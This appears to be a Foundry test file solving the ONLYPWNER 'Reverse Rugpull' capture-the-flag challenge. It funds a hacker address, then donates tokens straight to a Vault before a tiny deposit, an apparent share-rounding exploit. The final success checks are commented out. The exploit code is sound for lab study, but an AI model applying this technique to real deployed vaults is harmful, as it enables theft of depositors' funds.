// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/src/Test.sol";
import { console2 } from "@dev/forge-std/src/console2.sol";
import { MintableERC20, Vault } from "@contracts/CTF/ONLYPWNER/03.REVERSE-RUGPULL.sol";

/*
    forge test --match-path foundry/test/CTF/ONLYPWNER/03.REVERSE-RUGPULL.t.sol -vvvv
*/

/* solhint-disable  reentrancy */
contract REVERSE_RUGPULL_03_Test is Test {
    // hacking attack address
    address private hacker = address(2333);
    Vault private victimInstance;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        _before();
        // Deal attack address some ether
        vm.deal(hacker, 5 ether);
    }

    function _before() public {
        // 1.SetUp the exploit
        MintableERC20 token = new MintableERC20("TOKEN", "TOKEN", 10 ether);
        victimInstance = new Vault(address(token));
        token.transfer(address(hacker), 9 ether);
    }

    function _log() public view {
        console2.log(
            "Vault Balance:",
            victimInstance.token().balanceOf(address(victimInstance)),
            "Vault Shares:",
            victimInstance.totalShares()
        );
    }

    function test_Exploit() public {
        vm.startPrank(hacker);
        // 2.Run the exploit
        _log();

        victimInstance.token().approve(address(victimInstance), type(uint256).max);
        victimInstance.token().transfer(address(victimInstance), 0.1 ether - 2);
        _log();
        victimInstance.deposit(1);
        _log();
        // victimInstance.token().transfer(address(victimInstance), 100);
        // victimInstance.deposit(100);
        // victimInstance.withdraw(1);
        // _log();
        console2.log("CAL ", (uint256(0.1 ether * 1) / (0.1 ether - 1)));
        console2.log(uint256(10 ** 17), 0.1 ether);
        // 3.verify the exploit
        _after();
    }

    function _after() public {
        vm.stopPrank();
        // assertLt(
        //     victimInstance.token().balanceOf(address(victimInstance)), 0.1 ether, "Not solved: Valut have more token"
        // );
        // victimInstance.token().approve(address(victimInstance), type(uint256).max);
        // victimInstance.deposit(0.1 ether);
        // assertEq(victimInstance.shares(address(this)), 0, "Not solved: Valut have shares");
    }
}
/* solhint-enable  reentrancy */
